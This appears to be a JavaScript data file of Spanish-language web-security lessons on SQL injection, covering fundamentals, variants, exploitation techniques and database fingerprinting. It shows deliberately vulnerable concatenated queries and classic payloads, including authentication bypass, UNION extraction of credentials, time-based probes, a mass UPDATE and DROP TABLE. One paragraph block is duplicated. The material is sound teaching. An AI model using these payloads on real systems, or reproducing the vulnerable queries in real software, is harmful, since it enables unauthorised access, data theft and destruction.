    OWASP Foundation, XSS Prevention Cheat Sheet, [Online]. Available:
    <a href="https://owasp.org/www-community/xss-prevention" target="_blank">
      https://owasp.org/www-community/xss-prevention
    </a>
  </li>

  <li>
    OWASP Foundation, Cheat Sheet Series: DOM based XSS Prevention, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    Mozilla Developer Network, Web Security Concepts, [Online]. Available:
    <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
      https://developer.mozilla.org/en-US/docs/Web/Security
    </a>
  </li>

  <li>
    Google, Web Fundamentals: Security, [Online]. Available:
    <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
      https://developers.google.com/web/fundamentals/security
    </a>
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Indianapolis, IN, USA: Wiley Publishing, 2011.
  </li>
</ul>
      `
    },

    //Sección de inyección SQL
    'fundamentos-sqli': {
      id: 'fundamentos-sqli',
      title: 'Fundamentos de Inyección SQL',
      description: '¿Qué es la Inyección SQL y cómo amenaza la seguridad?',
      category: 'sqli',
      htmlContent: `
        <p>
La mayoría de las aplicaciones web modernas dependen de bases de datos relacionales para almacenar y consultar información. Lenguajes como SQL se utilizan para definir tablas, insertar registros, actualizar datos y ejecutar consultas que recuperan información. Desde el punto de vista de la aplicación, una operación típica consiste en recibir datos desde un formulario o desde la URL, construir una consulta SQL y enviarla al motor de base de datos para que la ejecute.
</p>

<p>
Cuando este proceso se diseña de manera incorrecta, los datos proporcionados por el usuario no se tratan como simples valores, sino como parte del propio lenguaje SQL. Esto abre la puerta a la inyección SQL, una de las vulnerabilidades más antiguas y críticas en el desarrollo web.
</p>

<h3>¿Qué es la inyección SQL?</h3>

<p>
La inyección SQL es una vulnerabilidad que se produce cuando una aplicación incluye datos proporcionados por el usuario dentro de una consulta SQL sin validarlos ni parametrizarlos adecuadamente. En lugar de ser tratados como texto literal, esos datos se interpretan como instrucciones adicionales para el motor de base de datos. El atacante aprovecha esta situación para alterar el significado original de la consulta y conseguir que la base de datos ejecute acciones no previstas por el desarrollador.
</p>

<p>
En términos simples, la aplicación confía demasiado en lo que recibe del usuario. En lugar de construir una consulta fija, con huecos claramente delimitados para los valores, concatena fragmentos de texto donde el usuario puede introducir comillas, operadores lógicos o palabras clave del lenguaje SQL. El resultado es que la base de datos no puede distinguir entre la consulta legítima y el código insertado por el atacante.
</p>

<h3>Construcción de una consulta vulnerable</h3>

<p>
Un patrón muy común de vulnerabilidad aparece cuando el desarrollador construye la consulta concatenando cadenas. Suponga un formulario de inicio de sesión con campos <code>usuario</code> y <code>contrasena</code>. Un pseudocódigo inseguro podría verse así:
</p>

<pre><code class="language-html highlight-vulnerable">const usuario = req.body.usuario;
const contrasena = req.body.contrasena;

const consulta = "SELECT * FROM usuarios " +
                 "WHERE usuario = '" + usuario + "' " +
                 "AND contrasena = '" + contrasena + "'";

db.query(consulta);
</code></pre>

<p>
En este ejemplo, la variable consulta contiene tanto la estructura fija de la instrucción SQL como los valores recibidos desde el formulario. El problema está en que <code>usuario</code> y <code>contrasena</code> se insertan directamente entre comillas simples dentro de la consulta. Si el usuario introduce valores normales, como <code>"carlos"</code> y <code>"Segura123"</code>, la instrucción resultante será similar a:
</p>

<pre><code class="language-html highlight-vulnerable">SELECT * FROM usuarios
WHERE usuario = 'carlos'
AND contrasena = 'Segura123'
</code></pre>

<p>
La base de datos interpreta esta consulta sin problemas. Sin embargo, nada impide que el campo <code>usuario</code> contenga caracteres especiales o fragmentos completos de SQL.
</p>

<h3>Alteración del significado de la consulta</h3>

<p>
La inyección ocurre cuando el atacante introduce un valor que rompe la estructura esperada de la consulta y añade nuevas condiciones o instrucciones. Por ejemplo, si en el campo <code>usuario</code> se introduce el texto:
</p>

<pre><code class="language-html highlight-vulnerable">admin' OR '1'='1
</code></pre>

<p>
y se mantiene una <code>contrasena</code> cualquiera, la consulta resultante será:
</p>

<pre><code class="language-html highlight-vulnerable">SELECT * FROM usuarios
WHERE usuario = 'admin' OR '1'='1'
AND contrasena = 'loquesea'
</code></pre>

<p>
En la práctica, la forma en que el motor evalúe esta condición puede permitir que la cláusula <code>OR</code> haga verdadera la condición completa. Si la consulta no está correctamente agrupada, el motor puede devolver filas independientemente de la contraseña real. El atacante no ha "adivinado" una contraseña, sino que ha modificado la lógica de autenticación para que acepte una condición que siempre se cumple.
</p>

<p>
Este ejemplo ilustra el núcleo de la inyección SQL: el texto enviado por el usuario deja de ser un valor y pasa a formar parte de la lógica de la consulta. La base de datos no distingue que una parte proviene de un formulario, solo ve una cadena SQL válida que ejecuta de acuerdo con sus reglas.
</p>

<h3>Alcance del riesgo</h3>

<p>
La inyección SQL no se limita a eludir autenticaciones. Dependiendo de los permisos con los que se ejecute la aplicación, un atacante puede leer información a la que no debería tener acceso, modificar registros existentes, insertar nuevos datos o eliminar tablas completas. En algunos motores de base de datos también es posible invocar funciones del sistema operativo, lo que eleva la vulnerabilidad desde un problema de aplicación a un compromiso casi total del servidor.
</p>

<p>
Por ejemplo, si la aplicación ejecuta consultas con una cuenta de base de datos que tiene permisos de administrador, una inyección en una simple página de búsqueda puede utilizarse para listar tablas internas, acceder a datos personales de otros usuarios o alterar estados de pedidos. La gravedad del ataque no depende solo de la consulta vulnerable, sino también de los privilegios asociados a la conexión.
</p>

<p>
Incluso cuando el atacante no consigue modificar datos, la capacidad de leer tablas sensibles, como usuarios, direcciones de correo, órdenes de compra o registros médicos, constituye una violación grave de confidencialidad.
</p>
<div class="warning-box">
<h4>Factores que favorecen la aparición de inyección SQL</h4>

<p>
La inyección SQL aparece con más facilidad en aplicaciones que:
</p>
<ul>
<li>
Aceptan entradas de usuario sin validación de formato.
</li>
<li>
Construyen consultas concatenando cadenas de texto.
</li>
<li>
Reutilizan cuentas de base de datos con privilegios demasiado amplios.
</li>
<li>
Carecen de una capa clara que separe la lógica de negocio del acceso a datos.
</li>
</ul>
</div>
<p>
En muchos casos, la vulnerabilidad no se debe a un único error, sino a una combinación de decisiones de diseño. Por ejemplo, un módulo que utiliza concatenación de cadenas puede no ser peligroso si todos los valores se generan internamente. Sin embargo, cuando se reutiliza la misma función para procesar datos provenientes de formularios, enlaces o parámetros de consulta, se introduce un canal directo entre el usuario y el intérprete SQL.
</p>

<h3>Contraste con una construcción segura básica</h3>

<p>
Aunque las técnicas de mitigación se estudian con más detalle en lecciones posteriores, resulta útil mostrar el contraste entre la construcción vulnerable y un enfoque más seguro. La idea general consiste en separar la consulta de los valores, de modo que el motor trate siempre los datos del usuario como parámetros y no como parte del código.
</p>

<p>
Reutilizan cuentas de base de datos con privilegios demasiado amplios.
</p>

<p>
Carecen de una capa clara que separe la lógica de negocio del acceso a datos.
</p>
</ul>
</div>
<p>
En muchos casos, la vulnerabilidad no se debe a un único error, sino a una combinación de decisiones de diseño. Por ejemplo, un módulo que utiliza concatenación de cadenas puede no ser peligroso si todos los valores se generan internamente. Sin embargo, cuando se reutiliza la misma función para procesar datos provenientes de formularios, enlaces o parámetros de consulta, se introduce un canal directo entre el usuario y el intérprete SQL.
</p>

<h3>Contraste con una construcción segura básica</h3>

<p>
Aunque las técnicas de mitigación se estudian con más detalle en lecciones posteriores, resulta útil mostrar el contraste entre la construcción vulnerable y un enfoque más seguro. La idea general consiste en separar la consulta de los valores, de modo que el motor trate siempre los datos del usuario como parámetros y no como parte del código.
</p>

<p>
Un ejemplo de uso de consultas parametrizadas en un entorno similar al anterior sería:
</p>

<pre><code class="language-html highlight-secure">const usuario = req.body.usuario;
const contrasena = req.body.contrasena;

const consulta = "SELECT * FROM usuarios " +
                 "WHERE usuario = ? AND contrasena = ?";

db.query(consulta, [usuario, contrasena]);
</code></pre>

<p>
En este caso, los signos de interrogación indican posiciones de parámetros. La consulta se envía al motor de base de datos de forma separada, y los valores de usuario y contrasena se transmiten como datos. El motor nunca los interpreta como parte de la lógica de la consulta, incluso si contienen comillas o palabras clave de SQL. La diferencia de diseño es pequeña a nivel sintáctico, pero muy importante desde el punto de vista de la seguridad.
</p>

<h3>Bibliografía</h3>
<ul>
  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Indianapolis, IN, USA: Wiley Publishing, 2011.
  </li>

  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>

  <li>
    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, 2nd ed., Redmond, WA, USA: Microsoft Press, 2003.
  </li>

  <li>
    National Institute of Standards and Technology, Database Security Guidelines, [Online]. Available:
    <a href="https://csrc.nist.gov" target="_blank">
      https://csrc.nist.gov
    </a>
  </li>
</ul>
      `
    },
    'tipos-sqli': {
      id: 'tipos-sqli',
      title: 'Tipos de Inyección SQL',
      description: 'Clasificación de variantes de ataques SQL injection',
      category: 'sqli',
      htmlContent: `
        <p>
Las vulnerabilidades de inyección SQL pueden manifestarse de distintas formas según cómo la aplicación procese las entradas del usuario, cómo construya las consultas y qué funcionalidades proporcione el motor de base de datos. Aunque todas comparten el principio fundamental de alterar la lógica de una consulta, cada variante se caracteriza por mecanismos específicos y diferentes niveles de visibilidad para el atacante.
</p>

<p>
En esta lección se describen las principales variantes de inyección SQL, explicando su comportamiento, los escenarios en los que suelen aparecer y cómo interactúan con el flujo interno de la aplicación. El objetivo es comprender de manera clara las diferencias entre cada tipo, lo cual resulta esencial para evaluar riesgos durante auditorías o pruebas de seguridad.
</p>

<h3>Inyección SQL clásica o directa</h3>

<h4>Descripción general</h4>

<p>
La forma clásica de inyección SQL aparece cuando el atacante puede manipular directamente la consulta mediante la inserción de comillas, operadores lógicos o fragmentos completos de SQL. En este escenario, la aplicación devuelve resultados visibles o un mensaje de error que permite confirmar el comportamiento del ataque.
</p>

<p>
Esta variante suele ser evidente cuando la consulta vulnerable está vinculada a funciones como autenticación, búsqueda o filtrado de registros.
</p>

<h4>Ejemplo representativo</h4>

<pre><code class="language-html highlight-vulnerable">const consulta = "SELECT * FROM productos WHERE nombre = '" + req.query.busqueda + "'";</code></pre>

<p>
Si el usuario escribe:
</p>

<pre><code class="language-html highlight-vulnerable">' OR '1'='1</code></pre>

<p>
la consulta resultante devuelve todos los registros. El atacante observa resultados anómalos, lo cual confirma el vector.
</p>

<h3>Inyección SQL basada en errores</h3>

<h4>Descripción general</h4>

<p>
En este tipo de ataque, el atacante provoca que la base de datos genere mensajes de error explícitos. Estos errores revelan detalles internos como nombres de tablas, sintaxis SQL y funciones disponibles. La aplicación muestra el error directamente o devuelve suficientes elementos para inferir la estructura interna.
</p>

<p>
Este escenario aparece sobre todo en aplicaciones que muestran errores sin filtrarlos o que manejan excepciones de forma inadecuada.
</p>

<h4>Ejemplo representativo</h4>

<pre><code class="language-html highlight-vulnerable">' ORDER BY 999--</code></pre>

<p>
En una tabla con pocas columnas, esto puede generar un error indicando que la columna no existe, lo cual permite inferir la cantidad real de columnas.
</p>

<h3>Inyección SQL ciega basada en booleanos</h3>

<h4>Descripción general</h4>

<p>
En la inyección SQL ciega, la aplicación no devuelve mensajes de error ni resultados visibles que permitan confirmar directamente la inyección. Sin embargo, el atacante puede deducir el comportamiento de la consulta observando diferencias en la respuesta, como contenido visible o ausencia de resultados.
</p>

<p>
La variante basada en booleanos manipula condiciones lógicas que devuelven <code>verdadero</code> o <code>falso</code>. La aplicación responde de manera diferente en cada caso, permitiendo extraer información bit a bit.
</p>

<h4>Ejemplo representativo</h4>

<p>
Suponga un parámetro <code>id</code> evaluado así:
</p>

<pre><code class="language-html highlight-vulnerable">/producto?id=10</code></pre>

<p>
El atacante prueba:
</p>

<pre><code class="language-html highlight-vulnerable">/producto?id=10 AND 1=1</code></pre>

<p>
y luego:
</p>

<pre><code class="language-html highlight-vulnerable">/producto?id=10 AND 1=2</code></pre>

<p>
Si las respuestas difieren, la vulnerabilidad queda confirmada.
</p>

<h3>Inyección SQL ciega basada en tiempo</h3>

<h4>Descripción general</h4>

<p>
Cuando la aplicación no muestra diferencias en contenido, algunos motores de base de datos permiten consultas que introducen demoras temporales. El atacante observa si la página tarda más en responder y así confirma el estado de la condición ejecutada dentro del servidor.
</p>

<p>
Esta variante es común cuando el servidor no revela errores y genera siempre la misma vista, independientemente del resultado de la consulta.
</p>

<h4>Ejemplo representativo</h4>

<pre><code class="language-html highlight-vulnerable">/producto?id=10 AND SLEEP(5)</code></pre>

<p>
Si la respuesta tarda notablemente más, se confirma la ejecución de la función.
</p>

<h3>Inyección SQL mediante unión de consultas</h3>

<h4>Descripción general</h4>

<p>
La técnica de unión (UNION SQL Injection) permite al atacante combinar el resultado de la consulta legítima con el de otra consulta arbitraria. Cuando la aplicación muestra resultados en pantalla, esta variante permite recuperar datos de otras tablas.
</p>

<p>
Este escenario es frecuente en secciones de búsqueda o listados donde el servidor muestra directamente filas devueltas por la consulta.
</p>

<h4>Ejemplo representativo</h4>

<pre><code class="language-html highlight-vulnerable">SELECT nombre, precio FROM productos WHERE categoria = 'electronica'</code></pre>

<p>
y el atacante introduce:
</p>

<pre><code class="language-html highlight-vulnerable">electronica' UNION SELECT usuario, contrasena FROM clientes--</code></pre>

<p>
lo que podría mostrar información sensible en pantalla.
</p>

<h3>Inyección SQL fuera de banda</h3>

<h4>Descripción general</h4>

<p>
En este tipo de ataque, el atacante no observa resultados directos ni retrasos temporales. En su lugar, utiliza funciones del motor de base de datos que generan efectos externos, como solicitudes <code>DNS</code> o <code>HTTP</code> hacia un servidor que controla. Cuando la aplicación ejecuta la consulta manipulada, el atacante monitorea si su servidor recibe dichas solicitudes, lo cual confirma la vulnerabilidad y en algunos casos filtra datos.
</p>

<p>
Esta variante aparece en motores que permiten llamadas externas, como en ciertos casos de <i>Microsoft SQL Server</i> u <i>Oracle</i>.
</p>

<h4>Ejemplo representativo</h4>

<p>
El atacante emplea una función que intenta resolver un nombre <code>DNS</code> externo. Si su servidor recibe la consulta, confirma que la instrucción se ejecutó dentro de la base de datos.
</p>

<h3>Bibliografía</h3>

<ul>
  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>

  <li>
    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    PortSwigger, SQL Injection, [Online]. Available:
    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
      https://portswigger.net/web-security/sql-injection
    </a>
  </li>

  <li>
    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, 2nd ed., Microsoft Press, 2003.
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
  </li>
</ul>
      `
    },
    'ejemplos-sqli': {
    id: 'ejemplos-sqli',
    title: 'Ejemplos y técnicas comunes de explotación',
    description: 'Payloads, queries y métodos frecuentes utilizados en la inyección SQL.',
    category: 'sqli',
    htmlContent: `
        <p>
Cuando una aplicación construye consultas SQL de manera insegura, el atacante puede manipular la entrada para alterar el comportamiento original de la consulta. La explotación de inyección SQL se basa en comprender cómo la aplicación procesa los parámetros y cómo el motor de base de datos interpreta el resultado final. Esta lección presenta ejemplos y técnicas comunes utilizadas durante auditorías y pruebas de penetración, mostrando cómo puede manipularse la consulta para obtener información, alterar registros o forzar cambios en la lógica interna de la aplicación.
</p>

<p>
El objetivo es desglosar la lógica de los <i>payloads</i> utilizados habitualmente, explicar por qué funcionan y analizar el impacto potencial dentro del motor de base de datos.
</p>

<h3>Manipulación básica de parámetros en consultas vulnerables</h3>

<p>
Un punto de inicio en la explotación consiste en verificar si los parámetros enviados por el usuario afectan la estructura de la consulta. Consideremos un <i>endpoint</i> vulnerable que filtra productos por nombre:
</p>

<pre><code class="language-html highlight-vulnerable">const consulta = "SELECT * FROM productos WHERE nombre = '" + req.query.nombre + "'";</code></pre>

<p>
Si el usuario introduce un nombre legítimo, como:
</p>

<pre><code class="language-html">Laptop</code></pre>

<p>
la consulta generada será:
</p>

<pre><code class="language-html">SELECT * FROM productos WHERE nombre = 'Laptop'</code></pre>

<p>
Sin embargo, si el parámetro incluye una comilla y una condición adicional:
</p>

<pre><code class="language-html highlight-vulnerable">' OR '1'='1</code></pre>

<p>
la consulta se transforma en:
</p>

<pre><code class="language-html highlight-vulnerable">SELECT * FROM productos WHERE nombre = '' OR '1'='1'</code></pre>

<p>
La cláusula <code>OR</code> modifica la lógica del filtro y provoca que el motor devuelva todos los registros. En este ejemplo, el atacante no obtiene información específica, pero confirma la vulnerabilidad y demuestra control sobre la consulta.
</p>

<h3>Uso de comentarios para controlar el resto de la instrucción</h3>

<p>
Los comentarios SQL permiten truncar la consulta desde el punto deseado. Esto es útil cuando la aplicación agrega condiciones adicionales después del parámetro. Si la aplicación construye:
</p>

<pre><code class="language-html">SELECT * FROM usuarios WHERE usuario = 'valor' AND activo = 1</code></pre>

<p>
y el atacante envía:
</p>

<pre><code class="language-html highlight-vulnerable">admin' --</code></pre>

<p>
la consulta se convierte en:
</p>

<pre><code class="language-html highlight-vulnerable">SELECT * FROM usuarios WHERE usuario = 'admin' -- ' AND activo = 1</code></pre>

<p>
El motor ignorará todo lo que sigue a los dos guiones. De esta forma, el atacante elimina verificaciones adicionales como estado del usuario, roles o restricciones internas. El comentario funciona porque el motor no interpreta nada después de él, lo cual modifica completamente la lógica prevista por el desarrollador.
</p>

<h3>Extracción de datos mediante consultas de unión</h3>

<p>
La técnica de unión consiste en aprovechar la cláusula <code>UNION</code> para combinar resultados de distintas consultas. Cuando la aplicación muestra los resultados directamente en la interfaz, es posible recuperar datos de otras tablas.
</p>

<p>
Supongamos una consulta vulnerable:
</p>

<pre><code class="language-html highlight-vulnerable">const consulta = "SELECT id, nombre FROM productos WHERE categoria = '" + req.query.categoria + "'";</code></pre>

<p>
Un parámetro malicioso como:
</p>

<pre><code class="language-html highlight-vulnerable">electronica' UNION SELECT usuario, contrasena FROM clientes</code></pre>

<p>
produce la consulta:
</p>

<pre><code class="language-html highlight-vulnerable">SELECT id, nombre FROM productos WHERE categoria = 'electronica'
UNION
SELECT usuario, contrasena FROM clientes</code></pre>

<p>
La aplicación mostrará los valores devueltos por la segunda consulta, lo cual es crítico cuando el resultado contiene información confidencial. Esta técnica funciona porque <code>UNION</code> requiere el mismo número de columnas y tipos compatibles, lo que permite manipular los datos mostrados en pantalla sin alterar la estructura global.
</p>

<h3>Enumeración de columnas mediante condiciones manipuladas</h3>

<p>
En etapas iniciales de una auditoría, el atacante intenta determinar cuántas columnas devuelve la consulta. Para ello se manipula el parámetro usando una serie de intentos lógicos. Sin mencionar herramientas de explotación, un ejemplo conceptual sería:
</p>

<pre><code class="language-html highlight-vulnerable">' ORDER BY 3 --</code></pre>

<p>
Si la tabla tiene solo dos columnas, la consulta:
</p>

<pre><code class="language-html">SELECT id, nombre FROM productos ORDER BY 3 --</code></pre>

<p>
generará un error indicando que la tercera columna no existe. Esta respuesta revela la estructura básica de la tabla. La técnica funciona porque <code>ORDER BY</code> requiere una columna válida, por lo que cualquier número fuera de rango produce un mensaje que confirma el límite real.
</p>

<h3>Explotación basada en booleanos para extraer información</h3>

<p>
Cuando la aplicación no muestra errores ni devuelve datos visibles, la técnica consiste en manipular la lógica y observar si el comportamiento cambia. El parámetro <code>id</code> de un detalle de producto podría verse así:
</p>

<pre><code class="language-html">/detalle?id=5</code></pre>

<p>
El atacante, prueba:
</p>

<pre><code class="language-html highlight-vulnerable">/detalle?id=5 AND 1=1</code></pre>

<p>
y luego:
</p>

<pre><code class="language-html highlight-vulnerable">/detalle?id=5 AND 1=2</code></pre>

<p>
Si la primera devuelve el producto correctamente y la segunda genera una página vacía, esto indica que el motor está evaluando la condición dentro de la consulta. A partir de aquí, es posible extraer información binaria, por ejemplo, comprobando si el primer carácter del usuario administrador es mayor que cierto valor <code>ASCII</code>.
</p>

<p>
La técnica funciona porque permite extraer datos sin necesidad de que la base de datos los muestre directamente, utilizando diferencias en la respuesta como canal de información.
</p>

<h3>Explotación basada en tiempo para confirmar condiciones</h3>

<p>
Cuando ni los errores ni el contenido difieren, algunos motores permiten funciones que producen demoras. El comportamiento del servidor revela si la condición es verdadera.
</p>

<p>
Un parámetro como:
</p>

<pre><code class="language-html highlight-vulnerable">id=10 AND SLEEP(4)</code></pre>

<p>
en un motor compatible produce una pausa en la respuesta. Si la aplicación tarda notablemente más en cargar la página, el atacante confirma la ejecución del código. Con variaciones de esta técnica, es posible extraer caracteres, longitudes o valores internos.
</p>

<p>
Este método es útil en entornos restrictivos porque no depende de mensajes de error ni de cambios visibles.
</p>

<h3>Manipulación de datos mediante inyecciones de actualización</h3>

<p>
La inyección SQL no solo sirve para leer datos. Cuando la consulta vulnerable corresponde a operaciones de actualización, un atacante puede modificar registros.
</p>

<p>
Un ejemplo inseguro podría ser:
</p>

<pre><code class="language-html highlight-vulnerable">const consulta = "UPDATE usuarios SET correo = '" + req.body.correo +
                 "' WHERE id = " + req.body.id;</code></pre>

<p>
Un atacante enviaría como valor de id:
</p>

<pre><code class="language-html highlight-vulnerable">5 OR 1=1</code></pre>

<p>
Lo cual genera:
</p>

<pre><code class="language-html highlight-vulnerable">UPDATE usuarios SET correo = 'nuevo@correo.com' WHERE id = 5 OR 1=1</code></pre>

<p>
El motor actualizará todos los registros, no solo uno, debido a que la condición siempre se cumple. La lógica de modificación cambia por completo, lo que demuestra cómo una operación aparentemente trivial puede causar daños de gran alcance en la integridad de la base de datos.
</p>

<h3>Eliminación de tablas mediante consultas inseguras</h3>

<p>
En bases de datos que ejecutan múltiples instrucciones por consulta, un campo vulnerable podría permitir la ejecución de comandos destructivos. Este ejemplo no utiliza casos reales, sino un patrón técnico:
</p>

<p>
Entrada insegura:
</p>

<pre><code class="language-html highlight-vulnerable">nombre=prueba'; DROP TABLE logs; --</code></pre>

<p>
Consulta final:
</p>

<pre><code class="language-html highlight-vulnerable">SELECT * FROM logs WHERE nombre = 'prueba'; DROP TABLE logs; --</code></pre>

<p>
El motor ejecutará ambas sentencias en orden si el gestor lo permite. Esto muestra cómo una inyección simple puede transformarse en un impacto severo sobre la disponibilidad del sistema. La técnica funciona porque la aplicación no valida el contenido y el motor no distingue entre el SQL legítimo y el malicioso cuando ambos aparecen en la misma instrucción.
</p>

<h3>Bibliografía</h3>
<ul>
  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>

  <li>
    PortSwigger, SQL Injection Cheatsheet, [Online]. Available:
    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
      https://portswigger.net/web-security/sql-injection
    </a>
  </li>

  <li>
    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, 2nd ed., Microsoft Press, 2003.
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
  </li>
</ul>
      `
    },
    'fingerprinting-dbms': {
      id: 'fingerprinting-dbms',
      title: 'Reconocimiento y fingerprinting de bases de datos (DBMS)',
      description: '¿Cómo identificar el tipo y versión de servidor en ataques de inyección SQL?',
      category: 'sqli',
      htmlContent: `
        <p>
Durante una evaluación de seguridad enfocada en inyección SQL, uno de los objetivos principales consiste en identificar el tipo exacto de Sistema Gestor de Base de Datos (DBMS) que utiliza la aplicación. Cada motor incorpora funciones específicas, estructuras internas y sintaxis distintivas. Por esa razón, conocer el DBMS permite comprender qué técnicas de explotación podrían o no funcionar, qué funciones están disponibles y qué posibilidades tiene un atacante para extraer información.
</p>

<p>
El fingerprinting de bases de datos se basa en observar diferencias en el comportamiento de la aplicación cuando se inyectan valores cuidadosamente diseñados. Incluso cuando no se revelan errores visibles, cada motor reacciona de manera particular ante ciertas expresiones, operadores, funciones internas y formatos. Esta lección explica las técnicas más empleadas para reconocer el DBMS detrás de una aplicación vulnerable.
</p>

<h3>Reconocimiento mediante funciones internas</h3>

<p>
Los motores de bases de datos exponen funciones integradas que no suelen existir en otros sistemas. Aprovechar estas funciones permite identificar el motor de forma precisa. Para ello, durante una auditoría se observa cómo reacciona la aplicación cuando la consulta contiene funciones disponibles solo en un motor específico.
</p>

<p>
Si se trabaja con una aplicación vulnerable que contiene una consulta como:
</p>

<pre><code class="language-html">const consulta = "SELECT * FROM productos WHERE id = " + req.query.id;</code></pre>

<p>
un auditor puede enviar un parámetro que incorpore una función característica. Por ejemplo:
</p>

<pre><code class="language-html">1 AND VERSION()</code></pre>

<p>
En MySQL, <code>VERSION()</code> es una función válida que devuelve la versión del motor. Si la aplicación muestra errores o contenido diferente ante esta expresión, se puede inferir que el motor reconoce la función.
</p>

<p>
Otros motores utilizan funciones distintas. <i><b>SQL Server</b></i> tiene <code>@@version</code>, <i><b>Oracle</b></i> dispone de funciones como <code>banner</code> y <i><b>PostgreSQL</b></i> posee funciones como <code>current_setting</code>. El análisis de la respuesta permite distinguir cuál de ellas está siendo ejecutada, dado que cada motor interpreta o rechaza la función de forma distinta.
</p>

<p>
Esta técnica se basa en el principio de que la sintaxis interna del DBMS rara vez coincide entre sistemas diferentes, y su aceptación o rechazo constituye un indicador fiable sobre el motor.
</p>

<h3>Identificación mediante concatenación de cadenas</h3>

<p>
Cada motor usa operadores diferentes para concatenar texto. Observar cómo reacciona la consulta ante una concatenación específica permite descubrir el DBMS subyacente.
</p>

<p>
Suponga que un auditor manipula el parámetro <code>id</code> en:
</p>

<pre><code class="language-html">/producto?id=10</code></pre>

<p>
y lo reemplaza por:
</p>

<pre><code class="language-html">10 AND 'A' || 'B'</code></pre>

<p>
El operador <code>||</code> es válido en <i><b>PostgreSQL</b></i> y <i><b>Oracle</b></i>, pero no en <i><b>MySQL</b></i> ni <i><b>SQL Server</b></i>. Si la aplicación responde sin error, se puede deducir que se está frente a uno de los motores que aceptan ese operador.
</p>

<p>
Otro ejemplo es:
</p>

<pre><code class="language-html">10 AND 'A' + 'B'</code></pre>

<p>
Este operador es característico de <i><b>SQL Server</b></i>. Si la aplicación lo interpreta correctamente, se puede inferir que el backend utiliza ese motor.
</p>

<p>
Las diferencias entre operadores de concatenación permiten identificar el motor sin necesidad de mensajes de error explícitos.
</p>

<h3>Fingerprinting mediante diferencias en funciones matemáticas o condicionales</h3>

<p>
Las funciones matemáticas básicas o las construcciones condicionales también difieren entre motores. Algunas funciones existen en <i><b>MySQL</b></i> y no en <i><b>SQL Server</b></i>, o tienen nombres distintos en <i><b>Oracle</b></i>.
</p>

<p>
Un auditor puede construir un parámetro como:
</p>

<pre><code class="language-html">10 AND IF(1=1, 1, 0)</code></pre>

<p>
<code>IF</code> es válido en <i><b>MySQL</b></i>, pero <i><b>SQL Server</b></i> utiliza <code>IIF</code> y <i><b>Oracle</b></i> emplea <code>DECODE</code> o <code>CASE</code>. Si la aplicación devuelve contenido modificado según la expresión, se confirma la ejecución de la función interna y por lo tanto el motor compatible con ella.
</p>

<p>
Otra variación sería:
</p>

<pre><code class="language-html">10 AND CASE WHEN 1=1 THEN 1 ELSE 0 END</code></pre>

<p>
<code>CASE WHEN</code> es compatible con prácticamente todos los motores modernos, pero ciertas particularidades en la sintaxis o en los mensajes de error pueden revelar el motor específico.
</p>

<p>
Estas diferencias son pequeñas desde la perspectiva del SQL estándar, pero suficientes para deducir el motor real.
</p>

<h3>Reconocimiento basado en diferencias de comentarios</h3>

<p>
Los comentarios <code>SQL</code> permiten detectar motores desde la capa superficial de la sintaxis. Según la base de datos, se admiten formatos distintos.
</p>

<p>
Una aplicación que responda correctamente a:
</p>

<pre><code class="language-html">10 -- prueba</code></pre>

<p>
indica compatibilidad con <i><b>MySQL</b></i>, <i><b>PostgreSQL</b></i> o <i><b>SQL Server</b></i>, ya que aceptan el comentario con doble guión. Si en cambio el motor solo acepta comentarios con <code>/* */</code> como <i><b>Oracle</b></i> en ciertos contextos, una expresión como:
</p>

<pre><code class="language-html">10 /* comentario */</code></pre>

<p>
puede ser interpretada correctamente en <i><b>Oracle</b></i> pero no en otros motores. La reacción del motor ante uno u otro formato sirve como indicador del DBMS subyacente.
</p>

<h3>Identificación mediante la cláusula LIMIT y alternativas</h3>

<p>
La forma en que cada DBMS limita el número de filas es un indicador claro del motor utilizado. Un auditor puede manipular el parámetro vulnerable y observar cómo se comporta la consulta.
</p>

<p>
<i><b>MySQL</b></i> y <i><b>PostgreSQL</b></i> aceptan:
</p>

<pre><code class="language-html">LIMIT 1</code></pre>

<p>
<i><b>SQL Server</b></i> utiliza:
</p>

<pre><code class="language-html">SELECT TOP 1</code></pre>

<p>
<i><b>Oracle</b></i> emplea construcciones como:
</p>

<pre><code class="language-html">ROWNUM = 1</code></pre>

<p>
Si se introduce un parámetro como:
</p>

<pre><code class="language-html">10 LIMIT 1</code></pre>

<p>
y el motor no produce error o responde de forma distinta, esto indica compatibilidad con un sistema específico. Esta técnica se basa en que la restricción de filas es distinta entre motores y difícilmente pasa desapercibida en un ataque controlado.
</p>

